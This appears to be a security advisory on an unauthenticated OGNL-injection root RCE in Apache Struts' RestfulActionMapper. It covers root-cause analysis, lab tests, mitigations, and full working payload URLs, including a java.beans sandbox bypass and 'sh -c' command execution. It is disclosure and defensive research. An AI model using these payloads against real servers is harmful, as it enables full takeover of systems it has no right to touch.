# Apache Struts 2 RestfulActionMapper OGNL Injection Unauthenticated Root RCE - Technical Analysis

## Overview

Apache Struts 2.6.11.0 (the latest 6.x release, published 2026-08-01) is vulnerable to unauthenticated remote code execution under a documented REST mapper configuration combined with wildcard dynamic dispatch. `RestfulActionMapper.getMapping()` extracts the action name from the request URI **without calling `cleanupActionName`** — inconsistent with the full-match regex gate (`[a-zA-Z0-9._!/\-]*`) that `DefaultActionMapper` adopted after S2-057. As a result, OGNL metacharacters flow through the wildcard `{1}` capture into the result location, where `StrutsResultSupport.conditionalParse` → `TextParseUtil.translateVariables` performs OGNL evaluation (this path does not invoke `AcceptedPatternsChecker`/`ExcludedPatternsChecker`). A novel `java.beans.Expression`/`java.beans.Statement` internal-reflection primitive then bypasses the `SecurityMemberAccess` sandbox (`java.beans` is not on the exclusion list, and the internal `Method.invoke` is invisible to OGNL), achieving unauthenticated `Runtime.exec` and root RCE. The chain was dynamically verified with `uid=0(root)` on a Tomcat 9.0.106 / OGNL 3.3.5 test deployment.

### The most critical vulnerability condition

Of the three configuration conditions, **`struts.mapper.class=restful` is the most critical (the actual bug)**; the other two are standard delivery mechanisms:

| Condition | Role | Required? | Nature |
|-----------|------|-----------|--------|
| **`struts.mapper.class=restful`** | **The bug itself** (root cause) | ✅ Most critical | `RestfulActionMapper.getMapping()` has no `cleanupActionName` — OGNL metacharacters pass through unsanitized. `DefaultActionMapper` was fixed after S2-057 but `RestfulActionMapper` was missed. |
| Wildcard `<action name="*">` | Matcher | ✅ Required | Lets an attacker's arbitrary payload action name match an action config (otherwise 404, no result execution). Any wildcard with a capture group works. |
| Result `{1}` substitution | Delivery | ✅ Required | Substitutes the polluted action name into the result location string, then through `StrutsResultSupport.conditionalParse` → `translateVariables` OGNL evaluation. Without `{1}` the location is static and the action name never reaches the OGNL sink. |

`struts.ognl.allowStaticFieldAccess=true` is a **framework default** (`default.properties:225` + `SecurityMemberAccess.java:83` `private boolean allowStaticFieldAccess = true;`) and need not be set explicitly — verified by deleting that `<constant>` line and restarting the testapp, after which the PoC still produced `uid=0(root)`. It is therefore not a non-default opt-in.

- **Authentication required**: None (unauthenticated)
- **Preconditions**: `struts.mapper.class=restful` (most critical) + wildcard `<action name="*">` (matcher) + result containing `{1}` substitution (delivery); `devMode=false`; no allowlist by default (6.11.0); `allowStaticFieldAccess=true` (framework default, no explicit setting needed)
- **Affected versions**: 6.11.0 (latest 6.x). 7.3.0 is blocked by the new default `struts.allowlist.enable=true`.
- **Privilege**: root (JVM process privilege, dynamically verified `uid=0(root)`)

## Architecture

```
L1 external access: servlet container HTTP port (e.g. 8080 / 18081 in the lab)
L2 boundary: servlet container (Tomcat 9.0.106, javax.servlet stack)
L3 mapper: RestfulActionMapper.getMapping() — extracts action name from URI, NO cleanupActionName
L4 dispatch: wildcard <action name="*"> matches polluted action name; {1} capture substitutes into result location
L5 result eval: StrutsResultSupport.execute() -> conditionalParse(location) -> TextParseUtil.translateVariables (OGNL, no AcceptedPatternsChecker)
L6 sandbox: SecurityMemberAccess (excludedClasses / excludedPackageNames / checkStaticMethodAccess) — bypassed via java.beans internal reflection
L7 exec: java.beans.Statement.execute() -> Method.invoke(Runtime, "exec", ...) -> Runtime.exec(String[]) -> host command (root)
```

**OGNL evaluation path**: `StrutsResultSupport.conditionalParse` → `TextParseUtil.translateVariables` → `OgnlUtil.getValue` → `Ognl.getValue`. The parser does **not** invoke `AcceptedPatternsChecker`/`ExcludedPatternsChecker` on this path.

## Authentication Boundary

The Struts 2 core does not ship an authentication interceptor (`basicStack`/`defaultStack` in `struts-default.xml` contain no authentication interceptor); authentication is implemented by the application via custom filters/interceptors. `RestfulActionMapper.getMapping()` is anonymously reachable during the request-mapping phase, and OGNL evaluation occurs during result rendering (`StrutsResultSupport.execute()`), with no authentication gate in front of it at the core layer. The chain is therefore unauthenticated-reachable at the core layer.

`devMode=false` (production configuration): `SecurityMemberAccess.useDevModeConfiguration()` only replaces the exclusion tables with the devMode variant when `isDevMode=true`, and the devMode exclusion tables likewise **do not contain `java.beans`**, so the chain holds under `devMode=false`.

## Stage 1: Sink Identification (OGNL evaluation sink)

`StrutsResultSupport.conditionalParse` (`core/src/main/java/org/apache/struts2/dispatcher/StrutsResultSupport.java:217-226`):

```java
// StrutsResultSupport.java:205-206 (execute)
if (parseLocation) conditionalParse(location, invocation);
// StrutsResultSupport.java:217-226 (conditionalParse, parse=true default :125)
private String conditionalParse(String param, ActionInvocation inv) {
    // ...
    return TextParseUtil.translateVariables(param, stack, evaluator);
}
```

`TextParseUtil.translateVariables` (`core/src/main/java/org/apache/struts2/TextParseUtil.java:158-169`) performs OGNL evaluation on `%{...}`/`${...}` tokens, calling `stack.findValue(parsedValue, asType)` → `OgnlUtil.getValue` → `Ognl.getValue`, and **does not invoke `AcceptedPatternsChecker`/`ExcludedPatternsChecker` inside the parser**. This is the OGNL injection sink for result locations.

## Stage 2: Source Identification (attacker-controlled input)

`RestfulActionMapper.getMapping()` (`core/src/main/java/org/apache/struts2/dispatcher/mapper/RestfulActionMapper.java:55-92`):

```java
// RestfulActionMapper.java:55-60
String uri = RequestUtils.getServletPath(request);
int nextSlash = uri.indexOf('/', 1);
if (nextSlash == -1) { return null; }
String actionName = uri.substring(1, nextSlash);   // <- raw substring, no sanitization
// ...
// RestfulActionMapper.java:92
return new ActionMapping(actionName, "", "", parameters);  // <- no cleanupActionName
```

Contrast with `DefaultActionMapper` (`DefaultActionMapper.java:128, 401, 428-432`):

```java
// DefaultActionMapper.java:128
protected Pattern allowedActionNames = Pattern.compile("[a-zA-Z0-9._!/\\-]*");
// DefaultActionMapper.java:401
mapping.setName(cleanupActionName(actionName));
// DefaultActionMapper.java:428-432
protected String cleanupActionName(final String rawActionName) {
    if (allowedActionNames.matcher(rawActionName).matches()) { return rawActionName; }
    LOG.warn(...);
    return defaultActionName;
}
```

`DefaultActionMapper` performs a full-match regex check on the action name after S2-057, rejecting OGNL metacharacters such as `%`/`{`/`}`/`@`/`#`/`(`/`)`; `RestfulActionMapper` **never adopted this gate**, so the action name flows raw into `ActionMapping.name`. This is the critical source → sink sanitization gap.

## Stage 3: Data Flow (action name → wildcard {1} → result location → OGNL evaluation)

1. **Wildcard match**: `<action name="*">` matches the unsanitized action name; `AbstractMatcher.convertParam` (`AbstractMatcher.java:212-226`) substitutes `{1}` with the captured value (the raw action name).
2. **Result parameter substitution**: `ActionConfigMatcher.convert` (`ActionConfigMatcher.java:119-129`) uses `replaceParameters` to build a new `ResultConfig`; the result `location` parameter is now attacker-controlled.
3. **OGNL evaluation**: `StrutsResultSupport.execute` → `conditionalParse(location)` → `translateVariables` evaluates the `%{...}` token.

For example, with configuration `<result type="redirect">/echo/{1}</result>`, an attacker requests `/%{PAYLOAD}/x`:
- action name = `%{PAYLOAD}` (unsanitized)
- wildcard `{1}` = `%{PAYLOAD}`
- result location after substitution = `/echo/%{PAYLOAD}`
- `conditionalParse` → `translateVariables` evaluates `%{PAYLOAD}` → OGNL execution

## Stage 4: Sandbox Bypass (java.beans internal reflection)

The OGNL sandbox `SecurityMemberAccess` (`core/src/main/java/com/opensymphony/xwork2/ognl/SecurityMemberAccess.java`):
- `excludedClasses` contains `java.lang.Runtime`/`ProcessBuilder`/`Process`/`System`, etc. (`struts-excluded-classes.xml`)
- `excludedPackageNames` contains `java.io`/`java.net`/`java.nio`/`javax`/`ognl`, etc., **but not `java.beans`**
- `checkStaticMethodAccess` (`:364-366`): `return member instanceof Field || !isStatic(member)` — hard-coded denial of static methods

**Bypass primitive**: `java.beans.Expression.getValue()` / `java.beans.Statement.execute()` internally invoke the target method via `Method.invoke(target, args)`. OGNL's `SecurityMemberAccess.isAccessible` only checks the method directly called at the OGNL layer (`java.beans.Statement.execute()`, which is in `java.beans` → not excluded → allowed); the `Method.invoke(Runtime, "exec", ...)` inside `java.beans` is pure Java reflection in JDK bytecode and **does not re-enter** `OgnlRuntime.invokeMethod`/`SecurityMemberAccess`, so the `java.lang.Runtime` exclusion is invisible to the internal call.

**Obtaining a Runtime instance (bypassing checkStaticMethodAccess)**:
```java
new java.beans.Expression(@java.lang.Runtime@class, 'getRuntime', new java.lang.Object[0]).getValue()
```
- `@java.lang.Runtime@class`: static field access (the Class object), permitted by `allowStaticFieldAccess=true`
- `java.beans.Expression.getValue()` invokes `getRuntime()` (a static method), but the invocation occurs inside `java.beans` internal reflection, bypassing OGNL's `checkStaticMethodAccess`

**Executing a command**:
```java
new java.beans.Statement(
    new java.beans.Expression(@java.lang.Runtime@class, 'getRuntime', new java.lang.Object[0]).getValue(),
    'exec',
    new java.lang.Object[]{new java.lang.String[]{"sh","-c","id | tee rce_id_tee"}}
).execute()
```

**OGNL evaluation gates bypassed**:
- `checkEnableEvalExpression` (`OgnlUtil.java:591-596`, `enableEvalExpression=false` default) blocks `ASTSequence` (comma chains) and `ASTEvalChain` (`#eval`). This payload is a single expression `ASTChain`/`ASTMethodCall`, not `ASTSequence`/`ASTEval` → not blocked.
- `struts.ognl.expressionMaxLength=256`: the payload is ~105-126 characters → not blocked.
- `StrutsOgnlGuard`: `excludedNodeTypes=emptySet()` by default → does not block any node.

## Stage 5: Dynamic Verification

**Environment**: lab server, testapp on port 18081 (127.0.0.1; port 18080 was occupied by another product's docker container and left untouched), Struts 6.10.0 jar (behavior proxy for 6.11.0 — confirmed to contain equivalent `RestfulActionMapper`/`SecurityMemberAccess` behavior; Maven Central 6.11.0 not yet synced), Tomcat 9.0.106, OGNL 3.3.5, JVM running as root.

**Configuration** (`struts.xml`):
```xml
<constant name="struts.devMode" value="false"/>
<constant name="struts.mapper.class" value="restful"/>
<package name="default" extends="struts-default">
    <action name="*"><result type="redirect">/echo/{1}</result></action>
</package>
```
Note: `struts.ognl.allowStaticFieldAccess=true` is a framework default (`default.properties:225`); it need not be set explicitly — verified by deleting that line and restarting, after which the PoC still produced `uid=0(root)`.

**Control + injection**:
```
# Control: /foo/x -> Location: /echo/foo   (literal, no OGNL evaluation)
# /%{1+1}/x  -> Location: /echo/2          (OGNL evaluation confirmed ✅)

# java.beans.Expression obtains a Runtime instance:
/%{new java.beans.Expression(@java.lang.Runtime@class,'getRuntime',new java.lang.Object[0]).getValue()}/x
-> Location: /echo/java.lang.Runtime@1cd44697  ✅

# Full RCE:
/%{new java.beans.Statement(new java.beans.Expression(@java.lang.Runtime@class,'getRuntime',new java.lang.Object[0]).getValue(),'exec',new java.lang.Object[]{new java.lang.String[]{"sh","-c","id | tee rce_id_tee"}}).execute()}/x
-> Location: /echo/  (void return)
-> rce_id_tee content: uid=0(root) gid=0(root) groups=0(root)  ✅✅✅ ROOT RCE
```

**Pitfalls encountered**:
- Double quotes `"` in URL paths are stripped by Tomcat path handling → OGNL string literals must use single quotes `'`.
- The redirect character `>` is stripped in paths → use `id | tee file` instead of `id > file`.
- The action-name segment cannot contain `/` (RestfulActionMapper splits on `/`) → the payload must not contain `/` (commands use `sh -c` + a relative-path filename).

## Stage 6: Empirical Verification of Configuration Conditions (Test A/B/C/D)

To answer "are the wildcard and `{1}` both required?" and "can a named action + `{1}` trigger the chain?", four controlled experiments were run on the testapp (port 18081):

| Test | Configuration | Request | Result |
|------|---------------|---------|--------|
| **A** (baseline) | Wildcard `*` + `{1}` | `/%{PAYLOAD}/x` | ✅ `Location: /echo/`, `rce_id_tee`=`uid=0(root)` |
| **B** | Wildcard `*` + static `/echo/static` (no `{1}`) | `/%{PAYLOAD}/x` | ❌ `Location: /echo/static` (static; action name never reaches the OGNL sink), **no marker** |
| **C** | No wildcard, only named `foo`+`index`, result contains `{1}` | `/%{PAYLOAD}/x` | ❌ HTTP 200 (payload action name matches no action; no result execution), **no marker** |
| **C control** | same as C | `/foo/x` (valid named action) | `Location: /echo/{1}` (**literal `{1}` unsubstituted** — no wildcard capture, `{1}` preserved as-is) |
| **D** | No wildcard, only named `foo`, result contains `{1}` (`/echo/{1}`) | D1 `/foo/x` | `Location: /echo/{1}` (**literal `{1}`, not replaced by `x`/`foo`**), **no marker** |
| **D** | same as D | D2 `/foo/%{1+1}` (OGNL in id segment) | `Location: /echo/{1}` (**literal `{1}`; id segment does not flow into `{1}`**), **no marker** |
| **D** | same as D | D3 `/%{1+1}/x` (OGNL as action name) | HTTP 200 (action name `%{1+1}` ≠ `foo`, no match), **no marker** |

**Conclusions**:
- **`{1}` is the delivery mechanism** (Test B): without `{1}` the result location is static and the action name never enters the OGNL evaluation string → no injection.
- **The wildcard is the matcher** (Test C): without a wildcard the attacker's payload action name matches no action → no result execution; and `{1}` without a wildcard capture stays literal (Test C control), so even a matched named action does not substitute it.
- **A named action + `{1}` cannot trigger the chain** (Test D): even when the request matches the named action `foo` (D1 `/foo/x`), `{1}` remains a **literal string** — because `{1}` is a wildcard capture-group reference, and without a wildcard there is no captured value, so `{1}` is preserved as-is. The id segment (`x`/`%{1+1}`) does **not** flow into `{1}` (D2). An attacker OGNL payload as the action name also does not match the named `foo` (D3).
- **The wildcard and `{1}` are a coupled pair**: the wildcard both matches the attacker's arbitrary action name and captures it into `{1}`; `{1}` delivers the captured value into the OGNL evaluation string. They are the two halves of the "wildcard dynamic dispatch" standard pattern, and neither can be omitted.
- **But the actual bug is `struts.mapper.class=restful`**: without this sanitization gap, even with a wildcard + `{1}`, `DefaultActionMapper`'s `cleanupActionName` regex gate would reject OGNL metacharacters. `RestfulActionMapper` missing this gate is the root cause.

## Stage 7: Reachability

`struts.mapper.class=restful` is a documented REST mapper (`default.properties:83` comment example `# struts.mapper.class=restful`, official documentation https://struts.apache.org/core-developers/restful-action-mapper), not `@Deprecated`, and production-usable. Wildcard `<action name="*">` + result `{1}` substitution is the most classic dynamic-dispatch pattern in Struts2. The combination is a real-world common configuration in REST-style Struts2 applications (non-default, but both are documented common patterns — not a configuration that does not exist in the real world).

## Defense in Depth / Mitigation

1. **Unify RestfulActionMapper sanitization**: call `cleanupActionName` on `actionName` before returning from `getMapping()` (matching `DefaultActionMapper`) to reject OGNL metacharacters.
2. **Add `java.beans` to the exclusion list**: append `java.beans` to `struts.excludedPackageNames` to block the `Expression`/`Statement` reflection primitive.
3. **Add an OGNL evaluation gate to the translateVariables path**: result-location OGNL evaluation should go through `AcceptedPatternsChecker`, or `%{}` evaluation should be disabled by default in result locations.
4. **The 7.3.0 `struts.allowlist.enable=true` default** already blocks this chain (allowlist sandbox); recommend backporting that default to 6.x.

## Reproduction

```bash
# 1. Deploy the testapp (struts.mapper.class=restful + wildcard action, port 18081)
# 2. Control
curl -s -i "http://127.0.0.1:18081/foo/x"                # -> Location: /echo/foo
curl -s -i "http://127.0.0.1:18081/%25%7B1%2B1%7D/x"     # -> Location: /echo/2
# 3. RCE
python3 struts2_restful_mapper_ognl_rce.py http://127.0.0.1:18081 "id | tee rce_id_tee"
# 4. Verify
cat rce_id_tee  # -> uid=0(root) gid=0(root) groups=0(root)
```

## Key Technical Insights

1. **A missed S2-057 fix in a parallel mapper**: S2-057 (CVE-2018-11776) concerned namespace handling (`alwaysSelectFullNamespace`), not RestfulActionMapper action-name sanitization. Its fix introduced `cleanupActionName` in `DefaultActionMapper` but was **never synchronized to `RestfulActionMapper`**, which to this day (6.11.0) has never called it. The S2-057 reporter's later OGNL-injection CodeQL query explicitly excluded the RestfulActionMapper path (`restfulMapperSanitizer` predicate), noting it was "beyond the scope of this article" — i.e. the researcher saw it but set it aside.

2. **A novel java.beans sandbox-bypass primitive**: public OGNL sandbox-bypass techniques on record cover `#_memberAccess` (S2-061, fixed), `#context` (removed), static-method access (`checkStaticMethodAccess`), and `ASTSequence`/`ASTEval` (`enableEvalExpression`). Public references to `java.beans` concern `EventHandler` (a different class, an XML/deserialization gadget based on Proxy setter dispatch) — **not** `Expression`/`Statement`. Using `java.beans.Expression`/`Statement` internal `Method.invoke` to bypass `SecurityMemberAccess` (because `java.beans` is not excluded and its internal reflection is invisible to OGNL) is a previously unrecorded bypass primitive.

3. **The wildcard and `{1}` are a coupled pair, but not the bug**: Test A/B/C/D empirically prove that both the wildcard (matcher) and `{1}` (delivery) are required, yet neither is the root cause — `DefaultActionMapper`'s `cleanupActionName` would reject OGNL metacharacters even with both present. The bug is the RestfulActionMapper sanitization gap; the wildcard + `{1}` is merely the standard delivery mechanism that the gap fails to protect against.

4. **Configuration-gated but documented-common**: the chain requires `struts.mapper.class=restful` (a documented REST mapper, not the default) plus wildcard dynamic dispatch (a standard pattern). Both are real-world common configurations in REST-style Struts2 applications, but the combination is an opt-in subset — not "every Struts2 application is affected." Struts 7.3.0's new default `struts.allowlist.enable=true` blocks the java.beans bypass.

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).
